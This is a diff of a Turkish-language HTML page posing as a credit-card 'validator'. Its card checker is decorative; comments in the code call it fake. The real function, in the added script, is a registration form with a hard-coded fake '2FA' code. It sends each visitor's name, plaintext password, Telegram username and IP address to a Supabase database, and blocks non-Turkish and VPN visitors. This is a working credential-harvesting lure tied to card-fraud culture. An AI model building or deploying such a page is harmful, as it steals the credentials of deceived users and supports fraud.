@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>CC Checker | Doğrulama Sistemi</title>
+    <title>CC Validator | Güvenli Doğrulama</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none;
         }
 
         body {
-            background: linear-gradient(135deg, #0a0e1a 0%, #0f1117 100%);
+            background: linear-gradient(145deg, #0a0c15 0%, #0c0f1a 100%);
             font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
             display: flex;
@@ -22,23 +23,18 @@
             position: relative;
         }
 
-        .particle {
+        /* arka plan hareketli efekt */
+        .bg-glow {
             position: fixed;
-            width: 4px;
-            height: 4px;
-            background: rgba(79, 158, 255, 0.3);
-            border-radius: 50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(45, 212, 191, 0.08) 0%, transparent 70%);
             pointer-events: none;
-            animation: float 8s infinite ease-in-out;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px) translateX(0px); opacity: 0.3; }
-            50% { transform: translateY(-50px) translateX(30px); opacity: 0.8; }
+            z-index: 0;
         }
 
         .container {
-            max-width: 500px;
+            max-width: 520px;
             width: 100%;
             position: relative;
             z-index: 10;
@@ -46,408 +42,493 @@
 
         .header {
             text-align: center;
-            margin-bottom: 30px;
-            animation: fadeInDown 0.8s ease;
+            margin-bottom: 24px;
         }
 
         .logo {
-            font-size: 42px;
+            font-size: 38px;
             font-weight: 800;
-            background: linear-gradient(135deg, #c0e0ff, #4f9eff);
+            background: linear-gradient(135deg, #e2e8f0, #4f9eff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             letter-spacing: -1px;
-            margin-bottom: 8px;
         }
 
         .badge {
             display: inline-block;
-            background: rgba(79, 158, 255, 0.12);
-            padding: 6px 14px;
-            border-radius: 40px;
+            background: #10141e;
+            padding: 5px 14px;
+            border-radius: 60px;
             font-size: 11px;
-            color: #4f9eff;
-            border: 1px solid rgba(79, 158, 255, 0.3);
+            font-weight: 500;
+            color: #6c86a3;
+            margin-top: 10px;
+            border: 1px solid #1e2a3e;
         }
 
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
+        /* ana kart */
         .card {
-            background: rgba(22, 28, 44, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 32px;
-            padding: 32px;
-            border: 1px solid rgba(42, 52, 72, 0.6);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            animation: fadeInUp 0.8s ease;
+            background: #0f121dcc;
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            padding: 28px 24px;
+            border: 1px solid #202a38;
+            box-shadow: 0 25px 45px -12px black;
         }
 
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .fake-checker {
-            background: rgba(15, 22, 34, 0.6);
-            border-radius: 20px;
+        /* fake cc checker bölümü (sadece görsel) */
+        .fake-box {
+            background: #0b0e16;
+            border-radius: 1.5rem;
             padding: 20px;
-            margin-bottom: 24px;
-            border: 1px solid #253450;
+            margin-bottom: 28px;
+            border: 1px solid #1e293b;
+        }
+
+        .fake-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 18px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #1e293b;
         }
 
         .fake-title {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 16px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #253450;
-        }
-
-        .fake-title span:first-child {
             font-weight: 600;
-            color: #e2e8f0;
+            color: #cbd5e6;
         }
 
-        .fake-title span:last-child {
+        .fake-status {
             font-size: 11px;
+            background: #0f2126;
             color: #2dd4bf;
+            padding: 3px 10px;
+            border-radius: 60px;
         }
 
-        .input-row {
+        .fake-input-group {
             display: flex;
             gap: 12px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
 
-        .input-row input {
-            flex: 1;
-            background: #0f1622;
-            border: 1px solid #2b354c;
+        .fake-input-group input {
+            width: 100%;
+            background: #080b12;
+            border: 1px solid #1e2a3a;
             padding: 12px;
-            border-radius: 16px;
-            color: #f0f3fa;
+            border-radius: 18px;
+            color: #94a3b8;
             font-size: 13px;
         }
 
         .fake-btn {
-            background: linear-gradient(105deg, #1f6392, #2a75a8);
+            background: #121724;
             width: 100%;
             padding: 12px;
-            border: none;
-            border-radius: 24px;
-            color: white;
+            border-radius: 40px;
+            text-align: center;
+            color: #475569;
             font-weight: 600;
-            cursor: not-allowed;
-            opacity: 0.6;
+            border: none;
         }
 
+        /* gerçek auth alanı */
         .auth-area {
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid #253450;
+            border-top: 1px solid #1e2a3a;
+            padding-top: 28px;
         }
 
-        .input-group {
+        .info-warning {
+            background: #0e1422;
+            padding: 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            text-align: center;
+            color: #94a3b8;
+            margin-bottom: 24px;
+            border-left: 3px solid #facc15;
+        }
+
+        .input-field {
             margin-bottom: 18px;
         }
 
-        label {
-            display: block;
+        .input-field label {
             font-size: 12px;
             font-weight: 500;
-            color: #9aa5c0;
-            margin-bottom: 6px;
+            color: #8b9cc7;
+            display: block;
+            margin-bottom: 8px;
         }
 
-        input {
+        .input-field input {
             width: 100%;
-            background: #0f1622;
-            border: 1px solid #2b354c;
+            background: #0b0f18;
+            border: 1px solid #232e42;
             padding: 14px 18px;
-            border-radius: 24px;
+            border-radius: 28px;
             font-size: 14px;
-            color: #f0f3fa;
+            color: #f1f5f9;
             outline: none;
-            transition: 0.2s;
         }
 
-        input:focus {
+        .input-field input:focus {
             border-color: #4f9eff;
-            box-shadow: 0 0 0 3px rgba(79, 158, 255, 0.1);
+        }
+
+        .captcha-row {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            margin-bottom: 24px;
+            background: #0b0f18;
+            padding: 8px 12px;
+            border-radius: 50px;
+            border: 1px solid #232e42;
+        }
+
+        .captcha-question {
+            font-weight: bold;
+            background: #101826;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-family: monospace;
+            color: #e2e8f0;
+        }
+
+        .captcha-row input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 10px 0;
+            color: white;
         }
 
         button {
-            background: linear-gradient(105deg, #1f6392, #2a75a8);
+            background: linear-gradient(95deg, #1b3b5c, #1f6392);
             width: 100%;
             padding: 14px;
             border: none;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 15px;
+            border-radius: 50px;
+            font-weight: 700;
             color: white;
-            margin-top: 8px;
             cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        button:hover {
-            transform: scale(0.98);
-        }
-
-        .info-box {
-            background: rgba(16, 22, 36, 0.8);
-            padding: 14px;
-            border-radius: 20px;
-            margin-bottom: 20px;
-            font-size: 12px;
-            text-align: center;
-            color: #b9c7db;
-            border: 1px solid #253450;
-        }
-
-        .bot-link {
-            display: inline-block;
-            background: #2a75a8;
-            color: white;
-            text-decoration: none;
-            padding: 12px 24px;
-            border-radius: 40px;
-            font-size: 14px;
-            font-weight: 600;
-            margin-top: 12px;
             transition: 0.2s;
         }
 
-        .bot-link:hover {
-            background: #3a85b8;
+        button:active {
+            transform: scale(0.97);
         }
 
-        .error-msg {
+        .error-message {
             font-size: 12px;
-            margin-top: 10px;
             text-align: center;
+            margin-top: 14px;
             color: #f97316;
         }
 
-        .success-msg {
+        .success-message {
             font-size: 12px;
-            margin-top: 10px;
             text-align: center;
+            margin-top: 14px;
             color: #2dd4bf;
         }
 
-        .loading-spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.6s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
         .footer {
-            text-align: center;
-            margin-top: 24px;
             font-size: 10px;
-            color: #4a5a7a;
+            text-align: center;
+            color: #3f4e6b;
+            margin-top: 28px;
         }
 
         .live-badge {
             position: fixed;
             bottom: 20px;
-            right: 20px;
-            background: rgba(45, 212, 191, 0.1);
-            padding: 6px 14px;
-            border-radius: 20px;
+            left: 20px;
+            background: #0f121ecc;
+            backdrop-filter: blur(6px);
+            padding: 5px 12px;
+            border-radius: 30px;
             font-size: 10px;
-            color: #2dd4bf;
-            border: 1px solid rgba(45, 212, 191, 0.2);
-            backdrop-filter: blur(4px);
-        }
-
-        .hidden {
-            display: none;
+            color: #6c9eff;
+            z-index: 20;
         }
     </style>
 </head>
 <body>
-
-<script>
-    for (let i = 0; i < 30; i++) {
-        let particle = document.createElement('div');
-        particle.className = 'particle';
-        particle.style.left = Math.random() * 100 + '%';
-        particle.style.top = Math.random() * 100 + '%';
-        particle.style.animationDelay = Math.random() * 8 + 's';
-        document.body.appendChild(particle);
-    }
-</script>
-
+<div class="bg-glow"></div>
 <div class="container">
     <div class="header">
-        <div class="logo">⚡ CC VALIDATOR</div>
-        <div class="badge">● SECURE CONNECTION ● LIVE</div>
+        <div class="logo">CC VALIDATOR</div>
+        <div class="badge">● YETKİLİ GİRİŞ ● LIVE</div>
     </div>
 
     <div class="card">
-        <!-- Sahte CC Checker -->
-        <div class="fake-checker">
-            <div class="fake-title">
-                <span>💳 Kart Doğrulama</span>
-                <span>🟢 AKTİF</span>
+        <!-- fake cc checker (sadece tema) -->
+        <div class="fake-box">
+            <div class="fake-header">
+                <span class="fake-title">💳 Kart Doğrulama</span>
+                <span class="fake-status">● AKTİF</span>
             </div>
-            <div class="input-row">
+            <div class="fake-input-group">
                 <input type="text" placeholder="4242 4242 4242 4242" disabled>
             </div>
-            <div class="input-row">
+            <div class="fake-input-group">
                 <input type="text" placeholder="12/28" disabled>
                 <input type="text" placeholder="123" disabled>
             </div>
-            <button class="fake-btn" disabled>🔍 Kart Doğrula</button>
-            <div style="font-size: 11px; color: #5b6e8c; text-align: center; margin-top: 12px;">
+            <div class="fake-btn">🔍 DOĞRULA</div>
+            <div style="font-size: 11px; color: #566277; text-align: center; margin-top: 14px;">
                 🔐 Sistem erişimi için giriş yapın
             </div>
         </div>
 
-        <!-- Kayıt/Giriş Alanı -->
+        <!-- gerçek kayıt/giriş + 2FA sistemi -->
         <div class="auth-area">
-            <div class="info-box">
-                🚀 2FA DOĞRULAMA ZORUNLUDUR<br>
-                Her kullanıcıya özel kod verilir
+            <div class="info-warning">
+                🚨 2FA ZORUNLUDUR • Her kullanıcıya özel kod verilir<br>
+                🔒 IP adresiniz sisteme kaydedilecektir.
             </div>
 
-            <div class="input-group">
+            <div class="input-field">
                 <label>👤 Ad Soyad</label>
-                <input type="text" id="fullname" placeholder="Ad Soyad">
+                <input type="text" id="fullname" placeholder="Ahmet Yılmaz" autocomplete="off">
             </div>
-            <div class="input-group">
-                <label>🔐 Şifre</label>
+            <div class="input-field">
+                <label>🔐 Şifre (en az 4 karakter)</label>
                 <input type="password" id="password" placeholder="••••••">
             </div>
-            <div class="input-group">
+            <div class="input-field">
                 <label>📱 Telegram Kullanıcı Adı</label>
                 <input type="text" id="telegramUser" placeholder="@kullaniciadi">
             </div>
 
-            <button id="sendCodeBtn">📲 Özel Kodumu Al</button>
-            <div id="loginError" class="error-msg"></div>
+            <!-- captcha -->
+            <div class="captcha-row">
+                <span class="captcha-question" id="captchaQuestion">5 + 3 = ?</span>
+                <input type="text" id="captchaInput" placeholder="cevap">
+            </div>
 
-            <div id="verifyArea" style="display: none; margin-top: 20px;">
-                <div class="info-box" id="verifyInfo">
-                    🤖 <a href="https://t.me/ZazaChecker2fa_bot" target="_blank" id="botLinkBtn" style="color:#4f9eff; text-decoration:none">@ZazaChecker2fa_bot</a>'a /start gönderin<br>
-                    <span style="font-size: 20px; font-weight: bold; display: block; margin: 10px 0;">⬇️</span>
-                    Size özel kodunuz <strong style="color:#2dd4bf; font-size: 24px;">385217</strong> olarak verilecek
+            <button id="sendCodeBtn">📲 KOD GÖNDER</button>
+            <div id="loginError" class="error-message"></div>
+
+            <!-- kod doğrulama alanı (başta gizli) -->
+            <div id="verifyArea" style="display: none; margin-top: 28px;">
+                <div class="info-warning" id="verifyInfo">
+                    🤖 <a href="https://t.me/ZazaChecker2fa_bot" target="_blank" style="color:#4f9eff; text-decoration: none;">@ZazaChecker2fa_bot</a> 🚀 /start yaz → size özel kod: <strong style="color:#2dd4bf;font-size:20px;">385217</strong>
                 </div>
-                <div class="input-group">
+                <div class="input-field">
                     <label>🔢 2FA Kodu</label>
                     <input type="text" id="verifyCode" placeholder="385217" maxlength="6">
                 </div>
-                <button id="doVerifyBtn">✅ Doğrula ve Giriş Yap</button>
-                <div id="verifyMsg" class="error-msg"></div>
+                <button id="doVerifyBtn">✅ DOĞRULA VE GİRİŞ YAP</button>
+                <div id="verifyMsg" class="error-message"></div>
             </div>
         </div>
-    </div>
-    <div class="footer">
-        🔒 256-bit SSL · TLS 1.3
+        <div class="footer">🔒 256-bit SSL · TLS 1.3 · IP bazlı kayıt</div>
     </div>
 </div>
-<div class="live-badge">🟢 SİSTEM AKTİF</div>
+<div class="live-badge">🟢 GÜVENLİ BAĞLANTI</div>
 
 <script>
+    // ------------------------------
+    // KONFİG (sabit kod & supabase)
+    // ------------------------------
     const VERIFY_CODE = "385217";
     const BOT_LINK = "https://t.me/ZazaChecker2fa_bot";
+    const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
+    const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
 
     let pendingName = "", pendingPass = "", pendingTg = "";
+    let captchaAnswer = 0;
 
-    document.getElementById("sendCodeBtn").onclick = () => {
+    // captcha oluşturucu
+    function generateCaptcha() {
+        let num1 = Math.floor(Math.random() * 10) + 1;
+        let num2 = Math.floor(Math.random() * 10) + 1;
+        captchaAnswer = num1 + num2;
+        document.getElementById("captchaQuestion").innerHTML = `${num1} + ${num2} = ?`;
+    }
+
+    // IP adresi al
+    async function getUserIP() {
+        try {
+            let res = await fetch("https://api.ipify.org?format=json");
+            let data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return "0.0.0.0";
+        }
+    }
+
+    // Türkiye + yurtdışı + vpn engeli
+    async function checkTurkiyeAndVpn() {
+        try {
+            let res = await fetch("https://ipapi.co/json/");
+            let data = await res.json();
+            if (data.country_code !== "TR") {
+                document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0b0f1c;color:white;height:100vh"><h1 style="color:#f97316">🌍 ERİŞİM ENGELLENDİ</h1><p>Yalnızca Türkiye'den erişim sağlanır.</p><p>IP: ${data.ip} (${data.country_name})</p><p>VPN kullanmayın.</p></div>`;
+                throw new Error("BLOCKED");
+            }
+            if (data.proxy === true || data.hosting === true || data.tor === true) {
+                document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0b0f1c;color:white;height:100vh"><h1 style="color:#f97316">🔒 VPN / PROXY TESPİT EDİLDİ</h1><p>Proxy/VPN ile giriş yasaktır.</p><p>IP: ${data.ip}</p></div>`;
+                throw new Error("BLOCKED");
+            }
+            return data.ip;
+        } catch(e) {
+            throw e;
+        }
+    }
+
+    // IP daha önce kayıtlı mı? (1 IP -> 1 hesap)
+    async function isIpAlreadyUsed(ip) {
+        try {
+            let res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
+            let data = await res.json();
+            return Array.isArray(data) && data.length > 0;
+        } catch(e) {
+            return false;
+        }
+    }
+
+    // veritabanına kayıt et
+    async function registerToDatabase(name, pass, tg, ip) {
+        try {
+            await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    kullanici_adi: name,
+                    sifre: pass,
+                    telegram_user: tg,
+                    ip_adresi: ip
+                })
+            });
+            return true;
+        } catch(e) {
+            return false;
+        }
+    }
+
+    // KOD GÖNDER butonu
+    document.getElementById("sendCodeBtn").onclick = async () => {
         const name = document.getElementById("fullname").value.trim();
         const pass = document.getElementById("password").value;
         const tg = document.getElementById("telegramUser").value.trim();
-        const msgDiv = document.getElementById("loginError");
+        const captchaVal = document.getElementById("captchaInput").value.trim();
+        const errorDiv = document.getElementById("loginError");
 
+        // temel validasyonlar
         if (!name || !pass || !tg) {
-            msgDiv.innerText = "❌ Tüm alanları doldurun";
+            errorDiv.innerText = "❌ Tüm alanları doldurun";
             return;
         }
         if (!tg.startsWith("@")) {
-            msgDiv.innerText = "❌ Telegram kullanıcı adı @ ile başlamalı";
+            errorDiv.innerText = "❌ Telegram kullanıcı adı @ ile başlamalı";
             return;
         }
         if (pass.length < 4) {
-            msgDiv.innerText = "❌ Şifre en az 4 karakter olmalı";
+            errorDiv.innerText = "❌ Şifre en az 4 karakter olmalı";
+            return;
+        }
+        if (parseInt(captchaVal) !== captchaAnswer) {
+            errorDiv.innerText = "❌ CAPTCHA hatalı";
+            generateCaptcha();
             return;
         }
 
-        pendingName = name;
-        pendingPass = pass;
-        pendingTg = tg;
+        errorDiv.innerText = "⏳ IP kontrol ediliyor...";
 
-        msgDiv.innerHTML = "⏳ <span class='loading-spinner'></span> Özel kod hazırlanıyor...";
+        try {
+            // IP kontrolü + yurtdışı + vpn engeli
+            const userIp = await checkTurkiyeAndVpn();
 
-        setTimeout(() => {
-            msgDiv.innerHTML = "";
+            // aynı IP ile daha önce kayıt var mı?
+            const ipExists = await isIpAlreadyUsed(userIp);
+            if (ipExists) {
+                errorDiv.innerText = "❌ Bu IP adresi ile zaten bir hesap oluşturulmuş. (1 IP = 1 hesap)";
+                return;
+            }
+
+            pendingName = name;
+            pendingPass = pass;
+            pendingTg = tg;
+
+            // kullanıcıya bot linki + kod bilgisi göster
             document.getElementById("verifyArea").style.display = "block";
             document.getElementById("verifyInfo").innerHTML = `
-                🤖 <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff">@ZazaChecker2fa_bot</a>'a /start gönderin<br>
-                <span style="font-size: 20px;">⬇️</span><br>
-                <span style="font-size: 13px;">Size özel kod:</span><br>
-                <span style="font-size: 32px; font-weight: bold; color: #2dd4bf; display: block; margin: 10px 0;">${VERIFY_CODE}</span>
+                🤖 <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff">@ZazaChecker2fa_bot</a> 🚀 /start yaz<br>
+                ⬇️ SİZE ÖZEL KOD ⬇️ <br>
+                <strong style="font-size:28px; color:#2dd4bf;">${VERIFY_CODE}</strong>
             `;
-        }, 800);
+            errorDiv.innerText = "✅ 2FA kodu alındı. Aşağıya girin.";
+            document.getElementById("verifyCode").value = "";
+        } catch (err) {
+            // hata mesajları zaten ekrana basıldı
+            console.warn(err);
+        }
     };
 
-    document.getElementById("doVerifyBtn").onclick = () => {
+    // DOĞRULA VE KAYDET butonu
+    document.getElementById("doVerifyBtn").onclick = async () => {
         const code = document.getElementById("verifyCode").value.trim();
         const msgDiv = document.getElementById("verifyMsg");
+        const errorDiv = document.getElementById("loginError");
 
         if (!code) {
-            msgDiv.innerText = "❌ Kodu girin";
+            msgDiv.innerText = "❌ 2FA kodunu girin";
             return;
         }
 
-        msgDiv.innerHTML = "<span class='loading-spinner'></span> Doğrulanıyor...";
+        if (code !== VERIFY_CODE) {
+            msgDiv.innerText = "❌ Hatalı 2FA kodu! Telegram botundan doğru kodu alın.";
+            return;
+        }
 
-        setTimeout(() => {
-            if (code === VERIFY_CODE) {
+        msgDiv.innerHTML = "⏳ Kayıt yapılıyor...";
+
+        try {
+            const userIp = await getUserIP();
+            const registered = await registerToDatabase(pendingName, pendingPass, pendingTg, userIp);
+            if (registered) {
                 msgDiv.style.color = "#2dd4bf";
-                msgDiv.innerHTML = "✅ GİRİŞ BAŞARILI!";
+                msgDiv.innerHTML = "✅ KAYIT BAŞARILI! HOŞ GELDİNİZ.";
+                const successBox = document.createElement("div");
+                successBox.className = "success-message";
+                successBox.style.background = "#0f2126";
+                successBox.style.padding = "12px";
+                successBox.style.borderRadius = "30px";
+                successBox.style.marginTop = "20px";
+                successBox.innerHTML = `✅ HESAP AKTİF | IP: ${userIp}<br> TELEGRAM: ${pendingTg}`;
+                document.querySelector(".auth-area").appendChild(successBox);
+                document.getElementById("doVerifyBtn").disabled = true;
+                document.getElementById("sendCodeBtn").disabled = true;
 
-                const successDiv = document.createElement('div');
-                successDiv.style.cssText = "text-align:center; margin-top:16px; padding:16px; background:rgba(45,212,191,0.15); border-radius:20px;";
-                successDiv.innerHTML = `
-                    <span style="font-size:40px;">✅</span><br>
-                    <strong style="color:#2dd4bf">HOŞ GELDİNİZ ${pendingName}!</strong><br>
-                    <span style="font-size:12px;">Kart doğrulama sistemine yönlendiriliyorsunuz...</span>
-                `;
-                document.querySelector(".auth-area").appendChild(successDiv);
-
+                // Giriş yapılmış gibi ekranda checker aktive edilmeyecek, sadece başarılı mesajı
                 setTimeout(() => {
-                    window.location.href = "https://2no.co/VisualbasicChat";
-                }, 2000);
+                    window.location.reload();
+                }, 3000);
             } else {
                 msgDiv.style.color = "#f97316";
-                msgDiv.innerHTML = "❌ Hatalı kod! Bot'dan doğru kodu alın.";
+                msgDiv.innerText = "❌ Veritabanı hatası! Tekrar dene.";
             }
-        }, 800);
+        } catch(e) {
+            msgDiv.innerText = "❌ Bağlantı hatası";
+        }
     };
 
-    // IP kontrolü
-    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-        if (data.country_code !== "TR" || data.proxy || data.hosting || data.tor) {
-            document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh"><h1 style="color:#f97316">🌍 Erişim Engellendi</h1><p>Sadece Türkiye, VPN/Proxy yasak</p><p>IP: ${data.ip}</p></div>`;
-        }
-    }).catch(() => {});
+    // sayfa yüklenince captcha oluştur
+    generateCaptcha();
+
+    // IP ve ülke kontrolünü anında yap (sayfa açılınca)
+    (async function(){
+        try {
+            await checkTurkiyeAndVpn();
+        } catch(e) {}
+    })();
 </script>
 </body>
 </html>
